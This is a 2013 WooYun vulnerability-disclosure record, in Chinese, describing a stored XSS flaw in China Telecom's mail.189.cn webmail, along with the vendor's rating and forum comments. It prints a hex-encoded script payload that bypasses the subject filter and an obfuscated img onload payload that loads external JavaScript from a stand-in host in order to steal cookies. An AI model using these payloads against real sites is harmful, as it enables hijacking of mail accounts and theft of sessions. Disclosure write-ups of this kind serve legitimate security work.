{"id": 10532, "wybug_id": "wooyun-2013-027826", "wybug_title": "中国电信mail.189.cn存储型Xss漏洞", "wybug_corp": "中国电信", "wybug_author": "J′aron", "wybug_date": "2013-07-05 12:08", "wybug_open_date": "2013-08-19 12:09", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-19：\t细节向公众公开  简要描述： 中国电信mail.189.cn Xss漏洞 详细说明：  首先对输入过滤进行测试，一般最开始就测试邮件内容方面：使用<script>alert(‘xss’)</script>\n\n在主题和内容部分，填写，在输入的时候，主题地方过滤了，内容木有过滤，输入过滤不代表能XSS（很多原因），下面开始研究主题的XSS过滤。经过一般测试，发现< >标签都已经过滤，就没测试其他标签，琢磨使用编码来测试，输入\\x3C\\x73\\x63\\x72\\x69\\x70\\x74\\x3E（<script>的编码）\n\n发现并木有在输入过滤，那么，这说明只要输出没有过滤就能XSS到，而且在主题处的XSS，只要登录邮箱就会被xxoo，把代码补全，\n\n然后发送给本测试账号。来试试绕过输出\n\n给出测试代码：\\x3C\\x73\\x63\\x72\\x69\\x70\\x74\\x3E\\x61\\x6C\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29\\x3B\\x3C\\x2F\\x73\\x63\\x72\\x69\\x70\\x74\\x3E等我们发送成功，然后同时也接受到了邮件，刷新，弹了：\n\n绕过输入和输出了！成功XSS到。当然弹框不是目的，存储型的危害相当大，盗取cookie或者是其他的操作才是目的，然后自己写一段，比如我调用的www.xxoo.com/xss.js,我们可以使用<img标签，然后加1个onload事件去调用外部的js代码，未加密前代码为：<img/src=”#”onload=”window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(119,119,119,46,120,120,111,111,46,99,111,109,47,120,115,115,46,106,115);document.body.appendChild(window.s)”>然后encode。\n\n   漏洞证明：  如上。   修复方案：  我可以大胆说- -洞不是我挖的。。不懂- -你们比我还专业。   版权声明：转载请注明来源 J′aron@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2013-07-09 23:30 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-05 14:14 |    \t\tJ′aron \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | 问题真实存在但是影响不大.)\t\t \n  @xsser 求个码 行不    \n     2013-07-09 12:56 |    \t\tJ′aron \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | 问题真实存在但是影响不大.)\t\t \n  @中国电信 肿么了，还木确认。    \n     2013-08-19 14:58 |    \t\t温柔杀手 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 这是个马甲，用来装比)\t\t \n  原文在这里：http://www.sleepforest.com/topics/4/    \n     2013-08-19 14:59 |    \t\t温柔杀手 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 这是个马甲，用来装比)\t\t \n  @spy4man    \n     2013-08-19 15:01 |    \t\tSpy4man \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 职业运维师..)\t\t \n  转了漏洞来这发？有意思？    \n     2013-08-19 16:52 |    \t\tSpy4man \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 职业运维师..)\t\t \n  @J′aron 有点节操行么?好歹自己修改一下！把别人图改一下嘛！@xsser 怎么办?    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}